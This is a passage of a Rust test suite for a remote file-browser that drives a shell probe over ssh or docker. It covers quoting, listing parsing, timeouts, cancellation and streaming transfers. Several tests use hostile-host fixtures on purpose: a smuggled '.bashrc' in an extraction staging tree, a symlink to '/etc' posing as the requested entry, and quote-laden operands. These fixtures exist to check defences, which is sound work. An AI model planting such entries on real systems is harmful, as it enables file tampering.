        assert_eq!(error.kind(), io::ErrorKind::InvalidData);
        assert!(
            smuggled.join(".bashrc").exists(),
            "staging is not published"
        );

        // One entry, but not the one that was requested.
        let renamed = root.join("renamed");
        std::fs::create_dir(&renamed).unwrap();
        std::fs::create_dir(renamed.join("ssh")).unwrap();
        assert_eq!(
            validated_staged_tree(&renamed, expected)
                .unwrap_err()
                .kind(),
            io::ErrorKind::InvalidData
        );

        // The right name, but a link pointing wherever the host chose.
        let linked = root.join("linked");
        std::fs::create_dir(&linked).unwrap();
        std::os::unix::fs::symlink("/etc", linked.join("proj")).unwrap();
        assert_eq!(
            validated_staged_tree(&linked, expected).unwrap_err().kind(),
            io::ErrorKind::InvalidData
        );

        // An archive that produced nothing at all is not a download either.
        let empty = root.join("empty");
        std::fs::create_dir(&empty).unwrap();
        assert_eq!(
            validated_staged_tree(&empty, expected).unwrap_err().kind(),
            io::ErrorKind::InvalidData
        );

        std::fs::remove_dir_all(&root).unwrap();
    }

    /// Staging is private to this process and never survives the transfer,
    /// whichever way the transfer ended.
    #[test]
    fn download_staging_is_private_and_always_removed() {
        use std::os::unix::fs::PermissionsExt;

        let root = unique_temp_dir("staging-lifetime");
        std::fs::create_dir_all(&root).unwrap();

        let path = {
            let staging = DownloadStaging::create(&root).unwrap();
            assert_eq!(
                std::fs::metadata(&staging.path)
                    .unwrap()
                    .permissions()
                    .mode()
                    & 0o777,
                0o700
            );
            // Two live stagings in one process never collide, so a second
            // download cannot extract into the first one's tree.
            let other = DownloadStaging::create(&root).unwrap();
            assert_ne!(staging.path, other.path);
            std::fs::write(staging.path.join("partial"), b"half a tree").unwrap();
            staging.path.clone()
        };
        assert!(!path.exists(), "a partial extraction is never left behind");

        std::fs::remove_dir_all(&root).unwrap();
    }

    /// Use a child test process so the fake SSH PATH never affects parallel
    /// tests. This exercises the real home wrapper and capture watchdog, with
    /// no network service or installed SSH client required.
    #[cfg(unix)]
    #[test]
    fn running_home_probe_honors_cancellation() {
        const CHILD_MARKER: &str = "FILES_HOME_CANCELLATION_TEST_CHILD";
        if let Some(marker) = std::env::var_os(CHILD_MARKER) {
            let marker = PathBuf::from(marker);
            let host = host_fixture();
            let cancellation = CancelToken::default();
            let trigger = cancellation.clone();
            let setter = std::thread::spawn(move || {
                let deadline = std::time::Instant::now() + Duration::from_secs(5);
                while !marker.exists() && std::time::Instant::now() < deadline {
                    std::thread::sleep(Duration::from_millis(5));
                }
                let spawned = marker.exists();
                trigger.cancel();
                assert!(spawned, "the isolated home probe never started");
            });
            let started = std::time::Instant::now();
            let error = start_dir_with_overlay_cancel(
                &FsLocation::Remote(0),
                &[host],
                &FsExecutionOverlay::default(),
                &cancellation,
            )
            .unwrap_err();
            setter.join().unwrap();
            assert_eq!(error.kind(), io::ErrorKind::Interrupted);
            assert!(
                started.elapsed() < Duration::from_secs(10),
                "home waited for its ordinary deadline instead of cancellation"
            );
            return;
        }

        use std::os::unix::fs::PermissionsExt;
        let nonce = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let root =
            std::env::temp_dir().join(format!("forge-home-cancel-{}-{nonce}", std::process::id()));
        std::fs::create_dir(&root).unwrap();
        let ssh = root.join("ssh");
        std::fs::write(&ssh, "#!/bin/sh\nprintf '%s\\n' \"$$\" > \"$FILES_HOME_CANCELLATION_TEST_CHILD\"\nsleep 30 &\nwait\n").unwrap();
        std::fs::set_permissions(&ssh, std::fs::Permissions::from_mode(0o700)).unwrap();
        let mut paths = vec![root.clone()];
        paths.extend(std::env::split_paths(
            &std::env::var_os("PATH").unwrap_or_default(),
        ));
        let path = std::env::join_paths(paths).unwrap();
        let test_name = format!(
            "{}::running_home_probe_honors_cancellation",
            module_path!().split_once("::").unwrap().1
        );
        let output = std::process::Command::new(std::env::current_exe().unwrap())
            .args(["--exact", &test_name, "--nocapture"])
            .env("PATH", path)
            .env(CHILD_MARKER, root.join("spawned"))
            .output()
            .unwrap();
        std::fs::remove_dir_all(root).unwrap();
        assert!(
            output.status.success(),
            "isolated cancellation test failed: {}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        );
    }

    fn host_fixture() -> RemoteHost {
        RemoteHost {
            name: "devbox".to_string(),
            host: "dev.example.com".to_string(),
            user: Some("alice".to_string()),
            docker: false,
            deploy_artifact: None,
            remote_shell: "jsh".to_string(),
            session: None,
            ssh_args: vec!["-p".to_string(), "2222".to_string()],
            login_shell: true,
            multiplex: true,
            deploy: jterm_core::jsh_remote::Deploy::Off,
        }
    }

    fn transient_fixture() -> RemoteHostConfig {
        RemoteHostConfig {
            name: "alice@dev.example.com".to_string(),
            host: "dev.example.com".to_string(),
            user: Some("alice".to_string()),
            docker: false,
            remote_shell: "jsh".to_string(),
            session: None,
            ssh_args: vec!["-p".to_string(), "2222".to_string()],
            deploy: "off".to_string(),
            deploy_artifact: None,
        }
    }

    fn unique_temp_dir(tag: &str) -> PathBuf {
        let root = std::env::temp_dir().join(format!(
            "forge-remote-fs-{tag}-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&root).unwrap();
        root
    }

    #[test]
    fn single_quote_escapes_for_one_remote_reparse() {
        assert_eq!(sq("plain"), "'plain'");
        assert_eq!(sq("a b"), "'a b'");
        assert_eq!(sq("a'b"), "'a'\\''b'");
        // A lone quote is the empty-quoted string, an escaped quote, and
        // another empty-quoted string.
        assert_eq!(sq("'"), "''\\'''");
        assert_eq!(sq(""), "''");
        assert_eq!(sq("x\ny"), "'x\ny'");
    }

    #[test]
    fn ssh_argv_carries_script_in_argv_and_command_in_one_element() {
        let limit = REMOTE_LIST_PAIR_LIMIT.to_string();
        let argv = probe_argv(&host_fixture(), "list", &["/var/log", &limit]);
        assert_eq!(
            &argv[..argv.len() - 1],
            &[
                "ssh",
                "-o",
                "BatchMode=yes",
                "-o",
                "ConnectTimeout=10",
                "-p",
                "2222",
                "--",
                "alice@dev.example.com",
            ]
        );
        let command = &argv[argv.len() - 1];
        // Script and operands form exactly one argv element; stdin stays free.
        assert!(command.starts_with("sh -c '# remote-fs probe v4"));
        assert!(command.ends_with(" probe list '/var/log' '4097'"));
        assert!(command.contains("'\\''"));
    }

    #[test]
    fn ssh_argv_quotes_every_operand_and_handles_missing_user() {
        let mut host = host_fixture();
        host.user = None;
        host.ssh_args = Vec::new();
        let argv = probe_argv(&host, "mv", &["/a b/c", "/d'e"]);
        assert_eq!(argv[0], "ssh");
        assert_eq!(argv[argv.len() - 2], "dev.example.com");
        assert!(argv[argv.len() - 1].ends_with(" probe mv '/a b/c' '/d'\\''e'"));
    }

    #[test]
    fn docker_argv_passes_raw_operands_without_tty() {
        let mut host = host_fixture();
        host.docker = true;
        host.host = "builder".to_string();
        let argv = probe_argv(&host, "rm", &["/tmp/x y"]);
        assert_eq!(
            argv,
            vec![
                "docker",
                "exec",
                "-i",
                "-u",
                "alice",
                "builder",
                "sh",
                "-c",
                PROBE_SCRIPT,
                "probe",
                "rm",
                "/tmp/x y",
            ]
        );
        assert!(!argv.iter().any(|arg| arg == "-t"));

        host.user = None;
        let argv = probe_argv(&host, "home", &[]);
        assert_eq!(
            argv,
            vec![
                "docker",
                "exec",
                "-i",
                "builder",
                "sh",
                "-c",
                PROBE_SCRIPT,
                "probe",
                "home",
            ]
        );
    }

    #[test]
    fn list_parser_keeps_valid_odd_names_and_skips_non_utf8() {
        let mut bytes = Vec::new();
        bytes.extend_from_slice(b"d\0sub dir\0");
        bytes.extend_from_slice(b"f\0hello.txt\0");
        bytes.extend_from_slice(b"f\0line\nbreak\0");
        bytes.extend_from_slice(b"l\0dangling\0");
        bytes.extend_from_slice(b"f\0bad\xffname\0");
        let listing = parse_list(&bytes, Path::new("/data"));
        let names: Vec<_> = listing
            .entries
            .iter()
            .map(|entry| entry.name.as_str())
            .collect();
        assert_eq!(
            names,
            ["sub dir", "dangling", "hello.txt", "line\nbreak"]
                .into_iter()
                .collect::<Vec<_>>()
        );
        assert!(!listing.truncated);
        assert!(listing.entries[0].is_dir);
        assert!(!listing.entries[1].is_dir);
        // A symlink reports as a file: the tree must not try to expand it.
        assert_eq!(listing.entries[1].name, "dangling");
        assert!(!listing.entries[1].is_dir);
        assert!(listing
            .entries
            .iter()
            .all(|entry| !entry.name.contains('\u{fffd}')));
    }

    #[test]
    fn list_parser_skips_garbage_non_basenames_and_duplicate_paths() {
        // Unknown type, empty/dangerous names, a duplicate path and a
        // truncated trailing pair are dropped.
        let mut bytes = Vec::new();
        bytes.extend_from_slice(b"x\0what\0");
        bytes.extend_from_slice(b"f\0\0");
        bytes.extend_from_slice(b"f\0ok\0");
        bytes.extend_from_slice(b"d\0ok\0");
        bytes.extend_from_slice(b"f\0.\0f\0..\0f\0a/b\0");
        bytes.extend_from_slice(b"d\0truncated");
        let listing = parse_list(&bytes, Path::new("/d"));
        assert_eq!(listing.entries.len(), 1);
        assert_eq!(listing.entries[0].name, "ok");
        assert!(!listing.entries[0].is_dir, "the first valid pair wins");
        assert!(!listing.truncated);
    }

    #[test]
    fn list_parser_uses_the_extra_pair_as_a_truncation_sentinel() {
        let mut big = Vec::new();
        for index in 0..MAX_DIRECTORY_ENTRIES {
            big.extend_from_slice(format!("f\0entry-{index}\0").as_bytes());
        }
        let complete = parse_list(&big, Path::new("/d"));
        assert_eq!(complete.entries.len(), MAX_DIRECTORY_ENTRIES);
        assert!(!complete.truncated);

        big.extend_from_slice(b"f\0one-more\0");
        let truncated = parse_list(&big, Path::new("/d"));
        assert_eq!(truncated.entries.len(), MAX_DIRECTORY_ENTRIES);
        assert!(truncated.truncated);
    }

    #[test]
    fn list_parser_sorts_directories_first_then_case_insensitively() {
        let bytes = b"f\0Zulu\0d\0beta\0f\0Alpha\0d\0Able\0".as_slice();
        let listing = parse_list(bytes, Path::new("/d"));
        let names: Vec<_> = listing
            .entries
            .iter()
            .map(|entry| entry.name.as_str())
            .collect();
        assert_eq!(names, ["Able", "beta", "Alpha", "Zulu"]);
    }

    #[test]
    fn probe_status_maps_to_io_error_kinds() {
        let ok = probe_result(Capture {
            status: 0,
            stdout: b"data".to_vec(),
            stderr: Vec::new(),
        })
        .unwrap();
        assert_eq!(ok.stdout, b"data");
        assert_eq!(
            probe_result(Capture {
                status: 17,
                stdout: Vec::new(),
                stderr: Vec::new(),
            })
            .unwrap_err()
            .kind(),
            io::ErrorKind::AlreadyExists
        );
        assert_eq!(
            probe_result(Capture {
                status: 3,
                stdout: Vec::new(),
                stderr: Vec::new(),
            })
            .unwrap_err()
            .kind(),
            io::ErrorKind::NotFound
        );
        let other = probe_result(Capture {
            status: 4,
            stdout: Vec::new(),
            stderr: b"disk full".to_vec(),
        })
        .unwrap_err();
        assert_eq!(other.kind(), io::ErrorKind::Other);
        assert!(other.to_string().contains("disk full"));
    }

    #[test]
    fn run_capture_bounds_output_and_enforces_timeout() {
        let argv = |script: &str| vec!["sh".to_string(), "-c".to_string(), script.to_string()];
        let capture = run_capture(
            &argv("printf hello; exit 3"),
            b"",
            Duration::from_secs(5),
            64,
        )
        .unwrap();
        assert_eq!(capture.status, 3);
        assert_eq!(capture.stdout, b"hello");

        // A flood past the cap fails closed: the overflow is drained so the
        // child still exits, then the capture reports truncation instead of
        // handing back a silent prefix.
        let error = run_capture(
            &argv("yes flooded | head -c 100000"),
            b"",
            Duration::from_secs(10),
            4096,
        )
        .unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::InvalidData);

        let error =
            run_capture(&argv("sleep 30"), b"", Duration::from_millis(150), 64).unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::TimedOut);
    }

    #[test]
    fn run_capture_kills_the_whole_process_group_on_timeout() {
        // The backgrounded `sleep` would survive a plain `child.kill()` of the
        // shell and keep the stdout pipe open; the group kill must reap it
        // together with the probe.
        let argv = vec![
            "sh".to_string(),
            "-c".to_string(),
            "sleep 30 & wait".to_string(),
        ];
        let started = std::time::Instant::now();
        let error = run_capture(&argv, b"", Duration::from_millis(200), 64).unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::TimedOut);
        // A surviving `sleep` would pin the joined pipe readers for its 30s.
        assert!(started.elapsed() < Duration::from_secs(10));
    }

    #[test]
    fn cancelled_capture_is_rejected_before_subprocess_spawn() {
        let token = CancelToken::default();
        token.cancel();
        // This executable deliberately does not exist. Interrupted proves the
        // token was checked before `Command::spawn` could return NotFound.
        let argv = vec!["/forge-test-missing-probe".to_string()];
        let error = run_capture_or_cancel(&argv, b"", Duration::from_secs(5), 64, Some(&token))
            .unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::Interrupted);
    }

    #[test]
    fn cancelling_capture_kills_the_running_process_group() {
        let token = CancelToken::default();
        let cancel = token.clone();
        std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(100));
            cancel.cancel();
        });
        let argv = vec![
            "sh".to_string(),
            "-c".to_string(),
            "sleep 30 & wait".to_string(),
        ];
        let started = std::time::Instant::now();
        let error = run_capture_or_cancel(&argv, b"", Duration::from_secs(30), 64, Some(&token))
            .unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::Interrupted);
        assert!(started.elapsed() < Duration::from_secs(10));
    }

    #[test]
    fn new_name_validation_rejects_unusable_names() {
        assert!(validate_new_name("notes.txt").is_ok());
        assert!(validate_new_name("").is_err());
        assert!(validate_new_name(&"x".repeat(256)).is_err());
        assert!(validate_new_name(&"x".repeat(255)).is_ok());
        assert!(validate_new_name("a/b").is_err());
        assert!(validate_new_name("a\0b").is_err());
        assert!(validate_new_name(".").is_err());
        assert!(validate_new_name("..").is_err());
        assert!(validate_new_name("...").is_ok());
    }

    #[test]
    fn remote_home_parser_requires_absolute_strict_utf8() {
        assert_eq!(
            parse_home(b"/home/dev\n").unwrap(),
            PathBuf::from("/home/dev")
        );
        assert_eq!(
            parse_home(b"relative\n").unwrap_err().kind(),
            io::ErrorKind::InvalidInput
        );
        assert_eq!(
            parse_home(b"/home/\xff\n").unwrap_err().kind(),
            io::ErrorKind::InvalidData
        );
    }

    #[test]
    fn paste_destination_joins_source_name_into_target_dir() {
        assert_eq!(
            paste_destination(Path::new("/tmp/dst"), Path::new("/home/u/file.txt")),
            PathBuf::from("/tmp/dst/file.txt")
        );
        assert_eq!(
            paste_destination(Path::new("/tmp/dst"), Path::new("/")),
            PathBuf::from("/tmp/dst")
        );
    }

    #[test]
    fn local_ops_round_trip_and_refuse_to_clobber() {
        let root = unique_temp_dir("ops");
        let hosts: &[RemoteHost] = &[];
        let local = FsLocation::Local;

        create_dir(&local, hosts, &root.join("sub")).unwrap();
        create_file(&local, hosts, &root.join("sub/one.txt")).unwrap();
        std::fs::write(root.join("sub/one.txt"), b"payload").unwrap();

        // Create operations fail with AlreadyExists on an existing path.
        for result in [
            create_dir(&local, hosts, &root.join("sub")),
            create_file(&local, hosts, &root.join("sub/one.txt")),
        ] {
            assert_eq!(result.unwrap_err().kind(), io::ErrorKind::AlreadyExists);
        }

        // Copy recurses and preserves file contents.
        copy(&local, hosts, &root.join("sub"), &root.join("sub-copy")).unwrap();
        assert_eq!(
            std::fs::read(root.join("sub-copy/one.txt")).unwrap(),
            b"payload"
        );
        assert_eq!(
            copy(&local, hosts, &root.join("sub"), &root.join("sub-copy"))
                .unwrap_err()
                .kind(),
            io::ErrorKind::AlreadyExists
        );

        // Rename refuses an occupied destination.
        assert_eq!(
            rename(&local, hosts, &root.join("sub-copy"), &root.join("sub"))
                .unwrap_err()
                .kind(),
            io::ErrorKind::AlreadyExists
        );
        rename(&local, hosts, &root.join("sub-copy"), &root.join("moved")).unwrap();
        assert!(root.join("moved/one.txt").is_file());

        // Listing sees the moved directory.
        let names: Vec<_> = list_dir(&local, hosts, &root)
            .unwrap()
            .entries
            .into_iter()
            .map(|entry| entry.name)
            .collect();
        assert_eq!(names, ["moved", "sub"]);

        // Delete removes directories recursively, files plainly, and never "/".
        delete(&local, hosts, &root.join("moved")).unwrap();
        assert!(!root.join("moved").exists());
        assert_eq!(
            delete(&local, hosts, Path::new("/")).unwrap_err().kind(),
            io::ErrorKind::InvalidInput
        );

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn local_copy_refuses_a_directory_into_itself() {
        let root = unique_temp_dir("copy-self");
        let hosts: &[RemoteHost] = &[];
        let local = FsLocation::Local;
        create_dir(&local, hosts, &root.join("sub")).unwrap();
        create_file(&local, hosts, &root.join("sub/one.txt")).unwrap();

        // Direct: pasting `sub` into its own subdirectory must fail up front,
        // not recurse into the copy it is creating.
        assert_eq!(
            copy(&local, hosts, &root.join("sub"), &root.join("sub/inside"))
                .unwrap_err()
                .kind(),
            io::ErrorKind::InvalidInput
        );
        // A symlinked spelling of the destination parent resolves to the same
        // directory and must not sneak past the canonicalized guard.
        std::os::unix::fs::symlink(root.join("sub"), root.join("alias")).unwrap();
        assert_eq!(
            copy(&local, hosts, &root.join("sub"), &root.join("alias/inside"))
                .unwrap_err()
                .kind(),
            io::ErrorKind::InvalidInput
        );
        // Both refusals fired before anything was created.
        assert!(!root.join("sub/inside").exists());

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn local_delete_removes_the_symlink_not_its_target() {
        let root = unique_temp_dir("symlink");
        let hosts: &[RemoteHost] = &[];
        let local = FsLocation::Local;
        create_dir(&local, hosts, &root.join("real")).unwrap();
        create_file(&local, hosts, &root.join("real/keep.txt")).unwrap();
        std::os::unix::fs::symlink(root.join("real"), root.join("link")).unwrap();

        delete(&local, hosts, &root.join("link")).unwrap();
        assert!(root.join("real/keep.txt").is_file());
        assert!(!root.join("link").exists());

        let _ = std::fs::remove_dir_all(root);
    }

    /// Run the embedded probe under the local `sh` — the same argv shape and
    /// script bytes a remote side would receive, with `payload` as stdin.
    fn probe_locally_with_stdin(op: &str, args: &[&str], payload: &[u8]) -> Capture {
        let mut argv = vec![
            "sh".to_string(),
            "-c".to_string(),
            PROBE_SCRIPT.to_string(),
            "probe".to_string(),
            op.to_string(),
        ];
        argv.extend(args.iter().map(|arg| (*arg).to_string()));
        run_capture(
            &argv,
            payload,
            Duration::from_secs(10),
            PROBE_LIST_MAX_OUTPUT,
        )
        .unwrap()
    }

    fn probe_locally(op: &str, args: &[&str]) -> Capture {
        probe_locally_with_stdin(op, args, &[])
    }

    #[test]
    fn probe_script_lists_and_mutates_a_real_directory() {
        let root = unique_temp_dir("probe");
        std::fs::write(root.join("file.txt"), b"data").unwrap();
        std::fs::create_dir(root.join("dir")).unwrap();
        std::os::unix::fs::symlink(root.join("dir"), root.join("dir-link")).unwrap();
        let root_arg = root.to_str().unwrap();
        let limit = REMOTE_LIST_PAIR_LIMIT.to_string();

        let listing = probe_locally("list", &[root_arg, &limit]);
        assert_eq!(listing.status, 0);
        let names: Vec<_> = parse_list(&listing.stdout, &root)
            .entries
            .into_iter()
            .map(|entry| (entry.name, entry.is_dir))
            .collect();
        // Classification tests -L first, so even a link to a directory is a
        // non-expandable wire type l.
        assert_eq!(
            names,
            vec![
                ("dir".to_string(), true),
                ("dir-link".to_string(), false),
                ("file.txt".to_string(), false),
            ]
        );

        // Relative paths and missing/invalid limits are rejected before the
        // directory is enumerated.
        assert_eq!(probe_locally("list", &["relative/path", &limit]).status, 2);
        assert_eq!(probe_locally("list", &[root_arg]).status, 2);
        assert_eq!(probe_locally("list", &[root_arg, "0"]).status, 2);
        assert_eq!(probe_locally("list", &[root_arg, "nope"]).status, 2);
        assert_eq!(
            probe_locally("list", &[&root.join("missing").to_string_lossy(), &limit]).status,
            3
        );

        let bounded = probe_locally("list", &[root_arg, "2"]);
        assert_eq!(bounded.status, 0);
        assert_eq!(
            bounded.stdout.split(|byte| *byte == 0).count() - 1,
            4,
            "two complete type/name pairs are the hard remote-side limit"
        );

        let new_dir = root.join("made").to_string_lossy().into_owned();
        assert_eq!(probe_locally("mkdir", &[&new_dir]).status, 0);
        assert_eq!(probe_locally("mkdir", &[&new_dir]).status, 17);

        let new_file = root.join("made/file").to_string_lossy().into_owned();
        assert_eq!(probe_locally("mkfile", &[&new_file]).status, 0);
        assert_eq!(probe_locally("mkfile", &[&new_file]).status, 17);

        let renamed = root.join("made/renamed").to_string_lossy().into_owned();
        assert_eq!(probe_locally("mv", &[&new_file, &renamed]).status, 0);
        assert_eq!(probe_locally("mv", &[&renamed, &new_dir]).status, 17);

        let copied = root.join("copied").to_string_lossy().into_owned();
        let made = root.join("made").to_string_lossy().into_owned();
        assert_eq!(probe_locally("cp", &[&made, &copied]).status, 0);
        assert!(root.join("copied/renamed").exists());
        assert_eq!(probe_locally("cp", &[&made, &copied]).status, 17);

        // rm refuses "/" and bare-relative paths, removes trees and links.
        assert_eq!(probe_locally("rm", &["/"]).status, 2);
        assert_eq!(probe_locally("rm", &[""]).status, 2);
        let link = root.join("dir-link").to_string_lossy().into_owned();
        assert_eq!(probe_locally("rm", &[&link]).status, 0);
        assert!(
            root.join("dir").is_dir(),
            "rm of a symlink spares the target"
        );
        assert_eq!(probe_locally("rm", &[&copied]).status, 0);
        assert!(!root.join("copied").exists());

        assert_eq!(probe_locally("bogus", &[]).status, 2);

        let home = probe_locally("home", &[]);
        assert_eq!(home.status, 0);
        assert!(parse_home(&home.stdout).unwrap().is_absolute());

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn probe_v2_cat_put_round_trip_is_binary_safe() {
        let root = unique_temp_dir("probe-v2-file");
        let target = root.join("blob.bin").to_string_lossy().into_owned();
        // Every byte value, twice: content must survive the stream unchanged.
        let payload: Vec<u8> = (0..=255u8).chain(0..=255u8).collect();

        let put = probe_locally_with_stdin("put", &[&target], &payload);
        assert_eq!(put.status, 0);
        assert_eq!(std::fs::read(root.join("blob.bin")).unwrap(), payload);
        // The temp file is renamed into place; nothing fspart is left behind.
        let leftovers: Vec<_> = std::fs::read_dir(&root)
            .unwrap()
            .flatten()
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .filter(|name| name.contains("fspart"))
            .collect();
        assert!(leftovers.is_empty(), "leftover temp files: {leftovers:?}");

        // Re-put to an existing path is refused before stdin is consumed.
        assert_eq!(probe_locally_with_stdin("put", &[&target], b"x").status, 17);
        assert_eq!(
            probe_locally_with_stdin("put", &["relative"], b"x").status,
            2
        );

        let cat = probe_locally("cat", &[&target]);
        assert_eq!(cat.status, 0);
        assert_eq!(cat.stdout, payload);
        // cat requires a readable regular file.
        let missing = root.join("missing").to_string_lossy().into_owned();
        assert_eq!(probe_locally("cat", &[&missing]).status, 3);
        assert_eq!(probe_locally("cat", &[&root.to_string_lossy()]).status, 3);

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn probe_v3_tar_untar_round_trip() {
        if local_tar_available().is_err() {
            return;
        }
        let root = unique_temp_dir("probe-v3-dir");
        std::fs::create_dir_all(root.join("tree/sub")).unwrap();
        std::fs::write(root.join("tree/top.txt"), b"top").unwrap();
        std::fs::write(root.join("tree/sub/nested.bin"), [0u8, 255, 1, 2]).unwrap();

        let tree = root.join("tree").to_string_lossy().into_owned();
        let tarred = probe_locally("tar", &[&tree]);
        assert_eq!(tarred.status, 0);
        assert!(!tarred.stdout.is_empty());

        // tar requires a directory.
        let file = root.join("tree/top.txt").to_string_lossy().into_owned();
        assert_eq!(probe_locally("tar", &[&file]).status, 3);
        let missing = root.join("missing").to_string_lossy().into_owned();
        assert_eq!(probe_locally("tar", &[&missing]).status, 3);

        let unpack = root.join("unpack");
        std::fs::create_dir(&unpack).unwrap();
        let unpack_arg = unpack.to_string_lossy().into_owned();
        // v3: untar takes the target directory and the expected top-level name.
        let untarred = probe_locally_with_stdin("untar", &[&unpack_arg, "tree"], &tarred.stdout);
        assert_eq!(untarred.status, 0);
        assert_eq!(std::fs::read(unpack.join("tree/top.txt")).unwrap(), b"top");
        assert_eq!(
            std::fs::read(unpack.join("tree/sub/nested.bin")).unwrap(),
            [0u8, 255, 1, 2]
        );

        // The same extraction again is refused BEFORE consuming stdin, and a
        // dangling symlink at the target also refuses.
        assert_eq!(
            probe_locally_with_stdin("untar", &[&unpack_arg, "tree"], &tarred.stdout).status,
            17
        );
        std::os::unix::fs::symlink(root.join("elsewhere"), unpack.join("dangling")).unwrap();
        assert_eq!(
            probe_locally_with_stdin("untar", &[&unpack_arg, "dangling"], &tarred.stdout).status,
            17
        );
        // Bad names and a missing target directory are usage/entry errors.
        for bad_name in ["", ".", "..", "a/b"] {
            assert_eq!(
                probe_locally_with_stdin("untar", &[&unpack_arg, bad_name], &tarred.stdout).status,
                2,
                "name {bad_name:?}"
            );
        }
        assert_eq!(
            probe_locally_with_stdin("untar", &[&missing, "tree"], &tarred.stdout).status,
            3
        );

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn probe_v3_stat_reports_type_and_size() {
        let root = unique_temp_dir("probe-v3-stat");
        std::fs::write(root.join("file.bin"), [0u8; 1234]).unwrap();
        std::fs::create_dir(root.join("dir")).unwrap();
        std::os::unix::fs::symlink(root.join("file.bin"), root.join("link")).unwrap();

        let file = probe_locally("stat", &[&root.join("file.bin").to_string_lossy()]);
        assert_eq!(file.status, 0);
        assert_eq!(
            parse_stat(&file.stdout).unwrap(),
            RemoteStat {
                is_dir: false,
                size: 1234
            }
        );

        let dir = probe_locally("stat", &[&root.join("dir").to_string_lossy()]);
        assert_eq!(dir.status, 0);
        assert_eq!(
            parse_stat(&dir.stdout).unwrap(),
            RemoteStat {
                is_dir: true,
                size: 0
            }
        );

        // A symlink to a non-dir reports as `l` with size 0.
        let link = probe_locally("stat", &[&root.join("link").to_string_lossy()]);
        assert_eq!(link.status, 0);
        assert_eq!(
            parse_stat(&link.stdout).unwrap(),
            RemoteStat {
                is_dir: false,
                size: 0
            }
        );

        let missing = root.join("missing").to_string_lossy().into_owned();
        assert_eq!(probe_locally("stat", &[&missing]).status, 3);
        assert_eq!(probe_locally("stat", &["relative"]).status, 2);

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn parse_stat_tolerates_padding_and_rejects_garbage() {
        // `wc -c` output may carry leading whitespace; split_whitespace copes.
        assert_eq!(
            parse_stat(b"f  123\n").unwrap(),
            RemoteStat {
                is_dir: false,
                size: 123
            }
        );
        assert_eq!(
            parse_stat(b"d 0\n").unwrap(),
            RemoteStat {
                is_dir: true,
                size: 0
            }
        );
        assert_eq!(
            parse_stat(b"l 0\n").unwrap(),
            RemoteStat {
                is_dir: false,
                size: 0
            }
        );
        assert!(parse_stat(b"").is_err());
        assert!(parse_stat(b"x 1\n").is_err());
        assert!(parse_stat(b"f\n").is_err());
        assert!(parse_stat(b"f abc\n").is_err());
    }

    /// The argv a remote `cat`/`put`/`tar`/`untar` probe would get, pointed
    /// at the local sh so streaming helpers can run without ssh or docker.
    fn local_probe_argv(op: &str, args: &[&str]) -> Vec<String> {
        let mut argv = vec![
            "sh".to_string(),
            "-c".to_string(),
            PROBE_SCRIPT.to_string(),
            "probe".to_string(),
            op.to_string(),
        ];
        argv.extend(args.iter().map(|arg| (*arg).to_string()));
        argv
    }

    #[test]
    fn download_streams_content_and_cleans_up_on_overflow() {
        let root = unique_temp_dir("download");
        let source = root.join("source.bin");
        let payload: Vec<u8> = (0..10_000u32).map(|index| (index % 251) as u8).collect();
        std::fs::write(&source, &payload).unwrap();
        let source_arg = source.to_string_lossy().into_owned();

        // Happy path: bytes land via temp + rename, leaving no fspart files.
        let dst = root.join("out/blob.bin");
        std::fs::create_dir(root.join("out")).unwrap();
        let argv = local_probe_argv("cat", &[&source_arg]);
        stream_download_to_file(
            &argv,
            &dst,
            64 * 1024,
            Duration::from_secs(10),
            TransferControl::default(),
        )
        .unwrap();
        assert_eq!(std::fs::read(&dst).unwrap(), payload);
        let leftovers: Vec<_> = std::fs::read_dir(root.join("out"))
            .unwrap()
            .flatten()
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .filter(|name| name.contains("fspart"))
            .collect();
        assert!(leftovers.is_empty(), "leftover temp files: {leftovers:?}");

        // Pre-existing dst is refused before any byte streams.
        let argv = local_probe_argv("cat", &[&source_arg]);
        assert_eq!(
            stream_download_to_file(
                &argv,
                &dst,
                64 * 1024,
                Duration::from_secs(10),
                TransferControl::default()
            )
            .unwrap_err()
            .kind(),
            io::ErrorKind::AlreadyExists
        );

        // Overflow: the partial temp file is unlinked and no dst appears.
        let dst2 = root.join("out/too-big.bin");
        let argv = local_probe_argv("cat", &[&source_arg]);
        let error = stream_download_to_file(
            &argv,
            &dst2,
            1_024,
            Duration::from_secs(10),
            TransferControl::default(),
        )
        .unwrap_err();
        assert!(error.to_string().contains("limit"), "{error}");
        assert!(!dst2.exists());
        let leftovers: Vec<_> = std::fs::read_dir(root.join("out"))
            .unwrap()
            .flatten()
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .filter(|name| name.contains("fspart"))
            .collect();
        assert!(leftovers.is_empty(), "leftover temp files: {leftovers:?}");

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn finalize_download_refuses_a_racing_creator() {
        let root = unique_temp_dir("finalize");
        let temp = root.join("temp");
        std::fs::write(&temp, b"payload").unwrap();
        let dst = root.join("dst");
        // A winner appearing between the pre-check and the rename is still
        // refused, and the guarded temp is unlinked afterwards.
        std::fs::write(&dst, b"winner").unwrap();
        {
            let guard = TempFileGuard(temp.clone());
            assert_eq!(
                finalize_download(&temp, &dst).unwrap_err().kind(),
                io::ErrorKind::AlreadyExists
            );
            drop(guard);
        }
        assert!(!temp.exists());
        assert_eq!(std::fs::read(&dst).unwrap(), b"winner");

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn upload_streams_content_and_surfaces_remote_exit_codes() {
